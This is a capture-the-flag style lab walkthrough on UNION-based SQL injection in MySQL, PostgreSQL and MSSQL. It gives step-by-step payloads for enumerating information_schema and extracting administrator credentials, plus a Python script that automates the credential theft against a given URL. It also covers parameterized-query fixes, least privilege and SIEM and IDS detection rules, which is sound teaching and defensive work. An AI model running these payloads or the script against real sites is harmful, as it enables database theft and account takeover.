# Lab Walkthrough: Listing Database Contents on Non-Oracle Databases

* **Vulnerability Type:** In-Band SQL Injection (UNION-Based)
* **Target Dialect:** Non-Oracle (MySQL, PostgreSQL, Microsoft SQL Server)
* **Skill Level:** Practitioner
* **Estimated Completion Time:** 30–45 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The scripts, payloads, methodologies, and technical documentation contained in this repository are strictly intended for educational exercises, CTF competitions, and authorized security assessments conducted under explicit, written engagement contracts. Testing against systems without verifiable, signed authorization violates national and international legal statutes (e.g., Computer Fraud and Abuse Act [CFAA 18 U.S.C. § 1030], UK Computer Misuse Act 1990). The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%231-vulnerability-architecture--mechanism)
2. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%232-lab-objectives--verification-criteria)
3. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%233-step-by-step-exploitation-flow)
* [Phase 1: Column Enumeration & Data Type Probing](https://www.google.com/search?q=%23phase-1-column-enumeration--data-type-probing)
* [Phase 2: Database Schema Extraction (Tables)](https://www.google.com/search?q=%23phase-2-database-schema-extraction-tables)
* [Phase 3: Database Schema Extraction (Columns)](https://www.google.com/search?q=%23phase-3-database-schema-extraction-columns)
* [Phase 4: Data Exfiltration & Account Takeover](https://www.google.com/search?q=%23phase-4-data-exfiltration--account-takeover)


4. [Automated Exploitation Script (Python PoC)](https://www.google.com/search?q=%234-automated-exploitation-script-python-poc)
5. [Cross-Engine Schema Enumeration Comparison](https://www.google.com/search?q=%235-cross-engine-schema-enumeration-comparison)
6. [Defense, Hardening & Secure Coding](https://www.google.com/search?q=%236-defense-hardening--secure-coding)
7. [SIEM Detection & Telemetry Analysis](https://www.google.com/search?q=%237-siem-detection--telemetry-analysis)
8. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%238-troubleshooting--diagnostic-runbook)
9. [References & Standards](https://www.google.com/search?q=%239-references--standards)

---

## 1. Vulnerability Architecture & Mechanism

UNION-based SQL injection allows an attacker to append their own `SELECT` statement to the original query executed by the application. When the backend database is **non-Oracle** (e.g., MySQL, PostgreSQL, MSSQL), it adheres to the ANSI SQL standard for database metadata: the `information_schema`.

The `information_schema` is a built-in database acting as a data dictionary. It contains read-only views that provide information about all databases, tables, and columns on the server. In real-world applications, developers often append random suffixes to sensitive tables (e.g., `users_8a92bf`) to prevent blind guessing. Querying the `information_schema` defeats this "security by obscurity" by revealing the exact structure of the database.

```text
Attacker HTTP Request:
GET /filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
                            │
                            ▼
┌────────────────────────────────────────────────────────────────────────┐
│ Web Application Layer                                                  │
│ Dynamic Query Construction:                                            │
│   $sql = "SELECT name, desc FROM products WHERE category = '"          │
│          . $_GET['category'] . "'";                                    │
└───────────────────────────────────┬────────────────────────────────────┘
                                    │
                                    ▼
┌────────────────────────────────────────────────────────────────────────┐
│ Relational Database Engine (e.g., PostgreSQL)                          │
│ Executes Composite Query:                                              │
│   SELECT name, desc FROM products WHERE category = 'Gifts'             │
│   UNION                                                                │
│   SELECT table_name, NULL FROM information_schema.tables-- '           │
└────────────────────────────────────────────────────────────────────────┘

```

> **Learning Checkpoint 1:** Why do we use `information_schema` instead of guessing table names? Modern frameworks and security-conscious developers often randomize table or column names (e.g., `users_xyz`). Guessing is inefficient and noisy. Querying `information_schema.tables` and `information_schema.columns` acts as a roadmap, providing exact names to target.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** `GET /filter?category=<PAYLOAD>`
* **Primary Objective:** Enumerate the database schema to find a hidden user table, extract the administrator's credentials, and log into the application.
* **Validation Signal:** Successful login as the `administrator` user.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Column Enumeration & Data Type Probing

Before querying the `information_schema`, we must align our injected `UNION SELECT` with the exact number of columns and data types used by the application's original query.

1. **Find Column Count:** Send payloads with increasing `NULL` values until the application returns an `HTTP 200 OK`.
```sql
'+UNION+SELECT+NULL--         (Returns 500 Internal Server Error)
'+UNION+SELECT+NULL,NULL--    (Returns 200 OK)

```


2. **Find String Columns:** Replace `NULL` with strings to verify the columns can hold text (which we need for table/column names).
```sql
'+UNION+SELECT+'abc','def'--

```


*Result:* The page renders "abc" and "def", confirming both columns accept string data.

### Phase 2: Database Schema Extraction (Tables)

Now we query the `information_schema.tables` view to list all tables in the database.

1. **Inject Table Enumeration Payload:**
```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--

```


2. **Analyze the Output:** Scroll through the rendered web page. You will see many default system tables (like `pg_catalog`), but look for a custom business table. You should find a table named something like `users_abcdef` (the suffix will be uniquely generated for your lab session).

### Phase 3: Database Schema Extraction (Columns)

Once we have the target table name (`users_abcdef`), we need to find the exact column names that hold the usernames and passwords.

1. **Inject Column Enumeration Payload:**
*Note: Replace `users_abcdef` with your actual table name.*
```sql
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--

```


2. **Analyze the Output:** The page will now list the columns belonging to that table. Look for identifiers like `username_abcdef` and `password_abcdef`.

### Phase 4: Data Exfiltration & Account Takeover

We now have the complete roadmap: the table name and the column names. We can query the target directly.

1. **Inject Data Extraction Payload:**
```sql
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--

```


2. **Harvest Credentials:** The page will display the usernames and passwords. Locate the password associated with the `administrator` account.
3. **Execute Takeover:** Navigate to the `/login` portal and authenticate using `administrator` and the harvested password.

> **Learning Checkpoint 2:** Why do we place `NULL` in the second column during Phase 2 and 3? The original query expects two columns, but `table_name` and `column_name` are single data points. Supplying `NULL` for the remaining required columns maintains the structural integrity of the `UNION` statement while preventing data type mismatch errors.

---

## 4. Automated Exploitation Script (Python PoC)

This script automates the schema enumeration and data exfiltration process.

```python
#!/usr/bin/env python3
import requests
import re
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli(url):
    s = requests.Session()
    base_path = f"{url}/filter?category="
    
    print("[*] Phase 1: Finding target users table...")
    # Payload to find tables containing 'users'
    payload_tables = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
    res = s.get(base_path + payload_tables, verify=False)
    
    # Regex to find the randomized users table (e.g., users_abcdef)
    table_match = re.search(r'(users_[a-z0-9]+)', res.text)
    if not table_match:
        print("[-] Could not find users table.")
        sys.exit(1)
        
    users_table = table_match.group(1)
    print(f"[+] Found users table: {users_table}")
    
    print("[*] Phase 2: Finding column names...")
    payload_columns = f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='{users_table}'--"
    res = s.get(base_path + payload_columns, verify=False)
    
    user_col_match = re.search(r'(username_[a-z0-9]+)', res.text)
    pass_col_match = re.search(r'(password_[a-z0-9]+)', res.text)
    
    if not user_col_match or not pass_col_match:
        print("[-] Could not find username/password columns.")
        sys.exit(1)
        
    user_col = user_col_match.group(1)
    pass_col = pass_col_match.group(1)
    print(f"[+] Found columns: {user_col}, {pass_col}")
    
    print("[*] Phase 3: Extracting Administrator Credentials...")
    payload_data = f"' UNION SELECT {user_col}, {pass_col} FROM {users_table}--"
    res = s.get(base_path + payload_data, verify=False)
    
    # Simple extraction assuming data is rendered in standard HTML table/list tags
    # Adjust regex based on specific DOM structure
    admin_match = re.search(r'administrator.*?<td>(.*?)</td>', res.text, re.DOTALL | re.IGNORECASE)
    # Fallback basic extraction if tags aren't exact
    if not admin_match:
         lines = res.text.split('\n')
         for i, line in enumerate(lines):
             if 'administrator' in line:
                 print(f"[+] Possible Admin Data around line: {line.strip()}")
                 try:
                     print(f"[+] Accompanying Password data: {lines[i+1].strip()}")
                 except IndexError:
                     pass
                 break
    else:
        print(f"[+] Administrator Password: {admin_match.group(1).strip()}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <TARGET_URL>")
        sys.exit(1)
    exploit_sqli(sys.argv[1].rstrip('/'))

```

---

## 5. Cross-Engine Schema Enumeration Comparison

While `information_schema` is standard across many engines, Oracle handles metadata differently.

| Target Database | Table Enumeration View | Column Enumeration View | Example Payload Structure |
| --- | --- | --- | --- |
| **PostgreSQL, MySQL, MSSQL** | `information_schema.tables` | `information_schema.columns` | `SELECT table_name FROM information_schema.tables` |
| **Oracle** | `all_tables` | `all_tab_columns` | `SELECT table_name FROM all_tables` |
| **SQLite** | `sqlite_master` | *PRAGMA table_info()* | `SELECT name FROM sqlite_master WHERE type='table'` |

---

## 6. Defense, Hardening & Secure Coding

The presence of UNION SQL injection indicates a failure to separate code from data.

### 1. Parameterized Queries (Prepared Statements)

This is the ultimate defense. Parameterization ensures that user input is never parsed as executable SQL commands, even if it contains quotes or SQL keywords.

**Vulnerable PHP (PDO):**

```php
$category = $_GET['category'];
$query = "SELECT name, description FROM products WHERE category = '" . $category . "'";
$db->query($query);

```

**Secure PHP (PDO):**

```php
$category = $_GET['category'];
$query = "SELECT name, description FROM products WHERE category = :category";
$stmt = $db->prepare($query);
$stmt->execute(['category' => $category]);

```

### 2. Principle of Least Privilege

The database user account utilized by the web application should *only* have access to the specific tables required for its operation. It should **not** have read access to the `information_schema` or system tables unless explicitly required by the framework.

> **Learning Checkpoint 3:** Relying on randomized table names (`users_xyz`) is an example of "Security by Obscurity." As demonstrated in this lab, an attacker with SQL injection capabilities can simply query the database schema to uncover these hidden names. Security must be enforced at the input validation and query execution layer, not by hiding targets.

---

## 7. SIEM Detection & Telemetry Analysis

Security Operations Centers (SOC) can detect schema enumeration attacks by monitoring for specific ANSI SQL metadata keywords in web traffic.

### Splunk / SIEM Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined status=200 OR status=500
| eval decoded_uri=urldecode(uri_query)
| search decoded_uri="*information_schema*" OR decoded_uri="*.tables*" OR decoded_uri="*.columns*"
| stats count by src_ip, uri_path, decoded_uri
| where count > 0

```

### Snort / Suricata IDS Rule

```snort
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"ATTACK [Offensive-Sec] SQLi Schema Enumeration (information_schema)";
    flow:to_server,established;
    content:"information_schema"; nocase; http_uri;
    pcre:"/information_schema\.(tables|columns)/i";
    classtype:web-application-attack;
    sid:2026002;
    rev:1;
)

```

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **HTTP 500 Internal Server Error on `UNION**` | Incorrect column count. | Increment the number of `NULL` placeholders (e.g., `NULL, NULL, NULL`) until the server returns HTTP 200. |
| **HTTP 500 after finding columns** | Data type mismatch. | Ensure you are only placing string values (like `table_name`) into columns that you have explicitly verified can accept text (using `'abc'`). Keep the rest as `NULL`. |
| **No Output Displayed** | Results are rendered off-screen or the primary query overrides output. | Force the original query to return empty by using an invalid category: `?category=DoesntExist'+UNION...` |
| **Syntax Error on Comment (`--`)** | Some engines (like MySQL) require a space after the dash. | Try `-- ` (with a trailing space) or `#` or `/*`. |

---

## 9. References & Standards

* [PortSwigger Web Security Academy: Database Examination](https://www.google.com/search?q=https://portswigger.net/web-security/sql-injection/examining-the-database)
* [OWASP Top 10-2021: A03 - Injection](https://www.google.com/search?q=https://owasp.org/Top10/A03_2021-Injection/)
* [ANSI SQL Standard - Information Schema](https://www.google.com/search?q=https://en.wikipedia.org/wiki/Information_schema)
* [MITRE ATT&CK Framework: Technique T1190 - Exploit Public-Facing Application](https://www.google.com/search?q=https://attack.mitre.org/techniques/T1190/)
